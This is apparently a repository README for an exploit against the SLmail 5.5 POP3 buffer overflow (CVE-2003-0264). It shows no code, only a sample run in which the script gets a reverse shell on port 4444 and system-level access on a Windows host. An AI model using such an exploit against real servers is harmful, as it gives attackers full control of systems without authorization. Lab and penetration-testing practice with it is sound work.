# CVE-2003-0264

Exploit for buffer overflow in SLmail 5.5 (CVE-2003-0264)

Based on:
* https://github.com/Gallopsled/pwntools
* https://github.com/rapid7/metasploit-framework

Example output:
```
$ ./slmail-into-shell.py
[+] Opening connection to 192.168.15.100 on port 110: Done

[+] Trying to bind to 0.0.0.0 on port 4444: Done
[+] Waiting for connections on 0.0.0.0:4444: Got connection from 192.168.15.100 on port 49168
[*] Received server hello
[*] Switching to interactive mode
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\SLmail\System>$ whoami
whoami
nt authority\system
 
C:\Program Files (x86)\SLmail\System>$
[*] Closed connection to 192.168.15.100 port 49168
[*] Closed connection to 192.168.15.100 port 110
